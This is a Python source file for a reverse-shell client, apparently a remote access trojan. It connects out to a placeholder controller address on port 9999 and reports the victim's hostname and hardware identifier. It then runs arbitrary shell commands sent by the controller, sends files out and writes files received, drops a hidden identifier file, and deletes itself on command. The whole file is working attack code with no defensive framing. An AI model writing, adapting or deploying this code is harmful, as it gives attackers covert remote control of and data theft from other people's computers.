import os
import os.path
import pathlib
import random
import socket
import string
import subprocess
import sys
import threading
import time

def info():
    #send hostname
    connection.send(socket.gethostname().encode())
    time.sleep(.001)
    #get serial number or create file if linux
    os_type = sys.platform.lower()
    if "darwin" in os_type:
        command = "ioreg -l | grep IOPlatformSerialNumber"
    elif "win" in os_type:
        command = "wmic csproduct get UUID"
    elif "linux" in os_type:
        def uuidGen(size=6, chars=string.ascii_uppercase + string.digits):
            return ''.join(random.choice(chars) for _ in range(size))
        os.chdir(pathlib.Path(__file__).parent.resolve())
        if not os.path.exists('.xuuid'):
            file1 = open('.xuuid', "w")
            file1.write(uuidGen(32))
            file1.close()
        command = "cat .xuuid"
    #send serial number
    connection.send(os.popen(command).read().replace("\n", "").replace("  ", "").replace(" ", "").replace("UUID","").encode())
    time.sleep(.001)

def conn():
    #Settings#############
    a = 'HOST_IP'
    b = 9999
    persist = False
    ######################
    if persist == True:
        perist = runPersist()
    success = False
    while(success == False):
        try:
            global connection
            connection = socket.socket()
            connection.connect((a, b))
            success = True
            info()
            start()
        except:
            time.sleep(10)

def cd(action):
    result = " "
    try:
        os.chdir(action)
        msg_size = str(sys.getsizeof(result))
        connection.send(msg_size.encode())
        time.sleep(.001)
        connection.send(result.encode())
    except:
        result =  "{}: No such file or directory".format(action)
        msg_size = str(sys.getsizeof(result))
        connection.send(msg_size.encode())
        time.sleep(.001)
        connection.send(result.encode())
def get(action):
    try:
        file = open(action, "rb")
        data = file.read()
        connection.sendall(data)
        time.sleep(.1)
        connection.send(b"<!EOF!>")
    except:
        connection.send(b"<!Failed!>")
def put(action):
    file = open(action, "wb")
    data = b""
    while True:
        buffer = connection.recv(1024)
        if buffer == b"<!EOF!>":
            break
        if buffer == b"<!Failed!>":
            file.close()
            if os.path.exists(action):
                os.remove(action)
            break
        else:
            data += buffer
    file.write(data)
    file.close()

def start():
    running = True
    killcli = False
    os_type = sys.platform.lower()
    commands = {
        'cd': cd,
        'get': get,
        'put': put,
    }
    while running == True:
        try:
            cmd = connection.recv(4096).decode()
            cmd_buffer = cmd
            cmd, _, action = cmd_buffer.partition(' ')
            if (cmd.lower() == 'kill' ):
                killcli = True
                running = False
            elif(cmd.lower() == 'connectionstatus'):
                pass
            elif(cmd.lower() == 'ls' and "win" in os_type):
                try:
                    result = subprocess.check_output("dir", stderr=subprocess.STDOUT, shell=True)
                except Exception as e:
                    result = str(e).encode()

                if len(result) == 0:
                    result = ' '.encode()
                msg_size = str(sys.getsizeof(result))
                connection.send(msg_size.encode())
                time.sleep(.001)
                connection.send(result)
            elif cmd in commands:
                if cmd in commands:
                    method = commands[cmd]
                    try:
                        method(action) if len(action) else method()
                    except Exception as e1:
                        pass
            else:
                try:
                    result = subprocess.check_output(cmd + ' ' + action, stderr=subprocess.STDOUT, shell=True)
                except Exception as e:
                    result = str(e).encode()

                if len(result) == 0:
                    result = ' '.encode()
                msg_size = str(sys.getsizeof(result))
                connection.send(msg_size.encode())
                time.sleep(.001)
                connection.send(result)
        except:
            os.chdir(pathlib.Path(__file__).parent.resolve())
            running = False
    if killcli == True:
        if os.path.exists('.xuuid'):
            os.remove('.xuuid')
        os.remove(sys.argv[0])
        quit()
    else:
        connection.close()
        conn()

if __name__ == "__main__":
    conn()